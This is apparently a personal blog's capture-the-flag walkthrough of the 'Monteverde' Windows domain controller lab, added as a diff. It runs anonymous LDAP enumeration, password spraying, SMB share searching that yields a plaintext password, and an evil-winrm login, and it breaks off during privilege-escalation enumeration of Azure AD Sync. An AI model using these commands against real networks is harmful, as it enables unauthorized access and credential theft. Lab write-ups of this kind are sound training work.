@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Windows - Medium - Monteverde - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Windows - Medium - Monteverde</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1754901587393"
+                  >2025-08-11 10:39</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1754910502421"
+                  >2025-08-11 13:08</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p>Nmap scan reveals domain controller for megabank.local, dns, ldap and smb.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ nmap <span class="hljs-operator">-</span>p<span class="hljs-operator">-</span> <span class="hljs-operator">-</span>A <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span>
+PORT      STATE SERVICE       VERSION
+<span class="hljs-number">53</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  domain        Simple DNS Plus
+<span class="hljs-number">88</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  kerberos<span class="hljs-operator">-</span>sec  Microsoft Windows Kerberos (server <span class="hljs-type">time</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-11</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">28</span>Z)
+<span class="hljs-number">135</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">139</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  netbios<span class="hljs-operator">-</span>ssn   Microsoft Windows netbios<span class="hljs-operator">-</span>ssn
+<span class="hljs-number">389</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)
+<span class="hljs-number">445</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  microsoft<span class="hljs-operator">-</span>ds?
+<span class="hljs-number">464</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  kpasswd5?
+<span class="hljs-number">593</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  tcpwrapped
+<span class="hljs-number">3268</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)
+<span class="hljs-number">3269</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  tcpwrapped
+<span class="hljs-number">5985</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>server<span class="hljs-operator">-</span>header: Microsoft<span class="hljs-operator">-</span>HTTPAPI<span class="hljs-operator">/</span><span class="hljs-number">2.0</span>
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>title: <span class="hljs-keyword">Not</span> Found
+<span class="hljs-number">9389</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  mc<span class="hljs-operator">-</span>nmf        .NET Message Framing
+<span class="hljs-number">49667</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49673</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">49674</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49676</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49693</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49746</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+
+Host script results:
+<span class="hljs-operator">|</span> smb2<span class="hljs-operator">-</span><span class="hljs-type">time</span>: 
+<span class="hljs-operator">|</span>   <span class="hljs-type">date</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-11</span>T08:<span class="hljs-number">37</span>:<span class="hljs-number">25</span>
+<span class="hljs-operator">|</span>_  start_date: N<span class="hljs-operator">/</span>A
+<span class="hljs-operator">|</span> smb2<span class="hljs-operator">-</span>security<span class="hljs-operator">-</span>mode: 
+<span class="hljs-operator">|</span>   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: 
+<span class="hljs-operator">|</span>_    Message signing enabled <span class="hljs-keyword">and</span> required</code></pre></div>
+<p>We can check if we can further enumerate the domain.</p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-6owi1lm3xr]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ python windapsearch<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">""</span> <span class="hljs-attr">--dc-ip</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>
+<span class="hljs-selector-attr">[+]</span> No username provided. Will try anonymous bind.
+<span class="hljs-selector-attr">[+]</span> Using Domain Controller at: <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>
+<span class="hljs-selector-attr">[+]</span> Getting defaultNamingContext from Root DSE
+<span class="hljs-selector-attr">[+]</span>	Found: DC=MEGABANK,DC=LOCAL
+<span class="hljs-selector-attr">[+]</span> Attempting bind
+<span class="hljs-selector-attr">[+]</span>	...success! Binded as: 
+<span class="hljs-selector-attr">[+]</span>	 None
+
+<span class="hljs-selector-attr">[*]</span> Bye!</code></pre></div>
+<p>And then enumerate the users.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ python windapsearch.py -u <span class="hljs-string">""</span> --dc-ip <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span> -U --admin-objects
+[+] No username provided. Will <span class="hljs-keyword">try</span> anonymous bind.
+[+] <span class="hljs-keyword">Using</span> Domain Controller at: <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>
+[+] Getting defaultNamingContext <span class="hljs-keyword">from</span> Root DSE
+[+]	Found: DC=MEGABANK,DC=LOCAL
+[+] Attempting bind
+[+]	...success! Binded <span class="hljs-keyword">as</span>: 
+[+]	 None
+
+[+] Enumerating all AD users
+[+]	Found <span class="hljs-number">10</span> users: 
+
+<span class="hljs-symbol">cn:</span> Guest
+
+<span class="hljs-symbol">cn:</span> AAD_987d7f2f57d2
+
+<span class="hljs-symbol">cn:</span> Mike Hope
+<span class="hljs-symbol">userPrincipalName:</span> mhope@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> SABatchJobs
+<span class="hljs-symbol">userPrincipalName:</span> SABatchJobs@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> svc-ata
+<span class="hljs-symbol">userPrincipalName:</span> svc-ata@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> svc-bexec
+<span class="hljs-symbol">userPrincipalName:</span> svc-bexec@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> svc-netapp
+<span class="hljs-symbol">userPrincipalName:</span> svc-netapp@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> Dimitris Galanos
+<span class="hljs-symbol">userPrincipalName:</span> dgalanos@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> Ray O<span class="hljs-comment">'Leary</span>
+<span class="hljs-symbol">userPrincipalName:</span> roleary@MEGABANK.LOCAL
+
+<span class="hljs-symbol">cn:</span> Sally Morgan
+<span class="hljs-symbol">userPrincipalName:</span> smorgan@MEGABANK.LOCAL
+
+[+] Attempting <span class="hljs-keyword">to</span> enumerate all admin (<span class="hljs-keyword">protected</span>) objects
+[+]	Found <span class="hljs-number">0</span> Admin Objects:
+
+
+[*] Bye!</code></pre></div>
+<p>There are two interesting accoutn names: <code>AAD_987d7f2f57d2</code> and <code>SABatchJobs@MEGABANK.LOCAL</code>. AAD indicates that Azure Active Directory is installed, so presumeably there is also Remote Managment.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ python windapsearch.py -u <span class="hljs-string">""</span> --dc-ip 10.129.228.111 -U -m <span class="hljs-string">"Remote Management Users"</span>
+[+] <span class="hljs-literal">No</span> username provided. Will try anonymous bind.
+[+] Using Domain Controller at: 10.129.228.111
+[+] Getting defaultNamingContext <span class="hljs-keyword">from</span> Root DSE
+[+]	Found: <span class="hljs-attribute">DC</span>=MEGABANK,DC=LOCAL
+&lt;snip&gt;
+[+] Attempting <span class="hljs-keyword">to</span> enumerate full DN <span class="hljs-keyword">for</span> group: Remote Management<span class="hljs-built_in"> Users
+</span>[+]	 Using DN: <span class="hljs-attribute">CN</span>=Remote Management Users,<span class="hljs-attribute">CN</span>=Builtin,DC=MEGABANK,DC=LOCAL
+
+[+]	 Found 1 members:
+
+b<span class="hljs-string">'CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL'</span></code></pre></div>
+<p>We can check if we can list shares.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ smbclient -N -L \\\\<span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span>\\
+Anonymous <span class="hljs-keyword">login</span> successful
+
+    Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span>
+    <span class="hljs-comment">---------       ----      -------</span>
+Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.
+do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span></code></pre></div>
+<p>We can do further enumeration with <code>enum4linux -A &lt;ip&gt;</code> and check that there is no lockout policy.</p>
+<div><pre class="hljs"><code><span class="hljs-attr">Domain password information:</span>
+  <span class="hljs-attr">Password history length:</span> <span class="hljs-number">24</span>
+  <span class="hljs-attr">Minimum password length:</span> <span class="hljs-number">7</span>
+  <span class="hljs-attr">Maximum password age:</span> <span class="hljs-number">41</span> <span class="hljs-string">days</span> <span class="hljs-number">23</span> <span class="hljs-string">hours</span> <span class="hljs-number">53</span> <span class="hljs-string">minutes</span>
+  <span class="hljs-attr">Password properties:</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_COMPLEX:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_NO_ANON_CHANGE:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_NO_CLEAR_CHANGE:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_LOCKOUT_ADMINS:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT:</span> <span class="hljs-literal">false</span>
+  <span class="hljs-bullet">-</span> <span class="hljs-attr">DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE:</span> <span class="hljs-literal">false</span>
+<span class="hljs-attr">Domain lockout information:</span>
+  <span class="hljs-attr">Lockout observation window:</span> <span class="hljs-number">30</span> <span class="hljs-string">minutes</span>
+  <span class="hljs-attr">Lockout duration:</span> <span class="hljs-number">30</span> <span class="hljs-string">minutes</span>
+  <span class="hljs-attr">Lockout threshold:</span> <span class="hljs-string">None</span>
+<span class="hljs-attr">Domain logoff information:</span>
+  <span class="hljs-attr">Force logoff time:</span> <span class="hljs-string">not</span> <span class="hljs-string">set</span></code></pre></div>
+<h1 id="foothold">Foothold</h1>
+<p>To start spraying, we can get all the users into a file. Then, we can check if anyone uses their username as their password.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-selector-attr">[★]</span>$ crackmapexec smb <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span> -d megabank -u /tmp/users<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> /tmp/users<span class="hljs-selector-class">.txt</span>
+<span class="hljs-selector-attr">[*]</span> First <span class="hljs-selector-tag">time</span> use detected
+<span class="hljs-selector-attr">[*]</span> Creating home directory structure
+&lt;snip&gt;
+<span class="hljs-selector-attr">[*]</span> Initializing RDP protocol database
+<span class="hljs-selector-attr">[*]</span> Copying default configuration file
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>  <span class="hljs-number">445</span>    MONTEVERDE       <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+&lt;snip&gt;
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">228.111</span>  <span class="hljs-number">445</span>    MONTEVERDE       <span class="hljs-selector-attr">[+]</span> megabank\SABatchJobs:SABatchJobs </code></pre></div>
+<p>We can check if we can execute commands on server. We cant.</p>
+<p><code>smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.129.228.111 -x whoami</code></p>
+<p>We can then check for any interesting files.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ smbmap -u SABatchJobs -p SABatchJobs -d megabank -H <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span> -A <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> -R
+[+] IP: <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span>:<span class="hljs-number">445</span>	<span class="hljs-type">Name</span>: <span class="hljs-number">10.129</span><span class="hljs-number">.228</span><span class="hljs-number">.111</span>                                    
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> azure_uploads.
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> IPC$.
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> NETLOGON.
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> SYSVOL.
+[+] Starting <span class="hljs-keyword">search</span> <span class="hljs-keyword">for</span> files matching <span class="hljs-string">'(xlsx|docx|txt|xml)'</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">share</span> users$.
+[+] Match <span class="hljs-built_in">found</span>! Downloading: users$\mhope\azure.xml</code></pre></div>
+<div><pre class="hljs"><code>└──╼ [★]$ cat 10.129.228.111-users_mhope_azure.xml
+��<span class="hljs-tag">&lt;<span class="hljs-name">Objs</span> <span class="hljs-attr">Version</span>=<span class="hljs-string">"1.1.0.1"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://schemas.microsoft.com/powershell/2004/04"</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">Obj</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">"0"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">TN</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">"0"</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>System.Object<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">TN</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">ToString</span>&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="hljs-tag">&lt;/<span class="hljs-name">ToString</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">Props</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">DT</span> <span class="hljs-attr">N</span>=<span class="hljs-string">"StartDate"</span>&gt;</span>2020-01-03T05:35:00.7562298-08:00<span class="hljs-tag">&lt;/<span class="hljs-name">DT</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">DT</span> <span class="hljs-attr">N</span>=<span class="hljs-string">"EndDate"</span>&gt;</span>2054-01-03T05:35:00.7562298-08:00<span class="hljs-tag">&lt;/<span class="hljs-name">DT</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">G</span> <span class="hljs-attr">N</span>=<span class="hljs-string">"KeyId"</span>&gt;</span>00000000-0000-0000-0000-000000000000<span class="hljs-tag">&lt;/<span class="hljs-name">G</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">S</span> <span class="hljs-attr">N</span>=<span class="hljs-string">"Password"</span>&gt;</span>4n0therD4y@n0th3r$<span class="hljs-tag">&lt;/<span class="hljs-name">S</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">Props</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">Obj</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">Objs</span>&gt;</span></code></pre></div>
+<p>We can then check if mhope uses it, as he has remote access. <code>evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'</code>. It works!</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>First we can check what is installed on the server.</p>
+<div><pre class="hljs"><code>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; cd <span class="hljs-string">"C:\Program Files"</span>
+*Evil-WinRM* PS C:\Program Files&gt; ls
+
+
+    Directory: C:\Program Files
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">9</span>:<span class="hljs-number">36</span> PM                Common Files
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                internet explorer
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">38</span> PM                Microsoft Analysis Services
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">51</span> PM                Microsoft Azure Active Directory Connect
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">37</span> PM                Microsoft Azure Active Directory Connect Upgrader
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">3</span>:<span class="hljs-number">02</span> PM                Microsoft Azure AD Connect Health Sync Agent
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">53</span> PM                Microsoft Azure AD Sync
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">38</span> PM                Microsoft SQL Server
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">25</span> PM                Microsoft Visual Studio <span class="hljs-number">10.0</span>
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">32</span> PM                Microsoft.NET
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/3/</span><span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">28</span> AM                PackageManagement
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">9</span>:<span class="hljs-number">37</span> PM                VMware
+d-r---         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                Windows Defender
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                Windows Defender Advanced Threat Protection
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Mail
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                Windows Media Player
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Multimedia Platform
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">28</span> AM                windows nt
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/2/</span><span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> PM                Windows Photo Viewer
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Portable Devices
+d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Windows Security
+d-----         <span class="hljs-number">1</span><span class="hljs-regexp">/3/</span><span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">28</span> AM                WindowsPowerShell</code></pre></div>
+<p>Further enumeration tools have restricted access.</p>
+<div><pre class="hljs"><code>*Evil-WinRM* PS C:\Program Files&gt; wmic.exe service get name
+WMIC.exe : <span class="hljs-type">ERROR</span>:
+    + CategoryInfo          : <span class="hljs-type">NotSpecified</span>: (ERROR::String) [], RemoteException
+    + FullyQualifiedErrorId : <span class="hljs-type">NativeCommandError</span>
+
+Description = <span class="hljs-keyword">Access</span> denied
+*Evil-WinRM* PS C:\Program Files&gt; sc.exe query state= <span class="hljs-keyword">all</span> 
+[SC] OpenSCManager FAILED <span class="hljs-number">5</span>:
+
+<span class="hljs-keyword">Access</span> <span class="hljs-keyword">is</span> denied.
+
+*Evil-WinRM* PS C:\Program Files&gt; net.exe start
+net.exe : <span class="hljs-type">System</span> error <span class="hljs-number">5</span> has occurred.
+    + CategoryInfo          : <span class="hljs-type">NotSpecified</span>: (System error <span class="hljs-number">5</span> has occurred.:String) [], RemoteException
+    + FullyQualifiedErrorId : <span class="hljs-type">NativeCommandError</span>
+
+<span class="hljs-keyword">Access</span> <span class="hljs-keyword">is</span> denied.</code></pre></div>
+<p>We can though continue enumeration of ADSync, which is used by AAD, and find its version.</p>
+<div><pre class="hljs"><code>*Evil-WinRM* PS C:\Program Files&gt; <span class="hljs-keyword">Get</span>-Item -<span class="hljs-type">Path</span> HKLM:\<span class="hljs-keyword">SYSTEM</span>\CurrentControlSet\Services\ADSync
+
+
+    Hive: HKEY_LOCAL_MACHINE\<span class="hljs-keyword">SYSTEM</span>\CurrentControlSet\Services
+
+
+<span class="hljs-type">Name</span>                           Property
+<span class="hljs-comment">----                           --------</span>
+ADSync                         <span class="hljs-keyword">Type</span>             : <span class="hljs-number">16</span>
+                               <span class="hljs-keyword">Start</span>            : <span class="hljs-number">2</span>
+                               ErrorControl     : <span class="hljs-number">1</span>
+                               ImagePath        : "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe"
+                               DisplayName      : Microsoft Azure AD Sync
+                               DependOnService  : {winmgmt}
+                               ObjectName       : MEGABANK\AAD_987d7f2f57d2
+                               Description      : Enables integration <span class="hljs-keyword">and</span> management <span class="hljs-keyword">of</span> <span class="hljs-keyword">identity</span> information across multiple directories, systems <span class="hljs-keyword">and</span> platforms. <span class="hljs-keyword">If</span> this service <span class="hljs-keyword">is</span> stopped <span class="hljs-keyword">or</span> disabled, <span class="hljs-keyword">no</span> synchronization <span class="hljs-keyword">or</span> <span class="hljs-keyword">password</span> management <span class="hljs-keyword">for</span>
+                               objects <span class="hljs-keyword">in</span> connected data
+                                                  sources will be performed.
+                               FailureActions   : {<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.</span>..}
+                               DelayedAutostart : <span class="hljs-number">1</span></code></pre></div>
+<p>We can then get version of the binary.</p>
+<div><pre class="hljs"><code><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ItemProperty</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-string">"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe"</span> <span class="hljs-operator">|</span> <span class="hljs-built_in">Format</span><span class="hljs-operator">-</span><span class="hljs-variable">list</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Property</span> <span class="hljs-operator">*</span> <span class="hljs-operator">-</span><span class="hljs-variable">Force</span>
+
+
+<span class="hljs-variable">PSPath</span>            <span class="hljs-operator">:</span> <span class="hljs-variable">Microsoft</span><span class="hljs-operator">.</span><span class="hljs-variable">PowerShell</span><span class="hljs-operator">.</span><span class="hljs-variable">Core</span>\<span class="hljs-variable">FileSystem</span><span class="hljs-string">::C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">Microsoft</span> <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> <span class="hljs-variable">Sync</span>\<span class="hljs-variable">Bin</span>\<span class="hljs-variable">miiserver</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
+<span class="hljs-variable">PSParentPath</span>      <span class="hljs-operator">:</span> <span class="hljs-variable">Microsoft</span><span class="hljs-operator">.</span><span class="hljs-variable">PowerShell</span><span class="hljs-operator">.</span><span class="hljs-variable">Core</span>\<span class="hljs-variable">FileSystem</span><span class="hljs-string">::C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">Microsoft</span> <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> <span class="hljs-variable">Sync</span>\<span class="hljs-variable">Bin</span>
+<span class="hljs-variable">PSChildName</span>       <span class="hljs-operator">:</span> <span class="hljs-variable">miiserver</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
+<span class="hljs-variable">PSDrive</span>           <span class="hljs-operator">:</span> <span class="hljs-built_in">C</span>
+<span class="hljs-variable">PSProvider</span>        <span class="hljs-operator">:</span> <span class="hljs-variable">Microsoft</span><span class="hljs-operator">.</span><span class="hljs-variable">PowerShell</span><span class="hljs-operator">.</span><span class="hljs-variable">Core</span>\<span class="hljs-variable">FileSystem</span>
+<span class="hljs-built_in">Mode</span>              <span class="hljs-operator">:</span> <span class="hljs-operator">-</span><span class="hljs-variable">a</span><span class="hljs-operator">----</span>
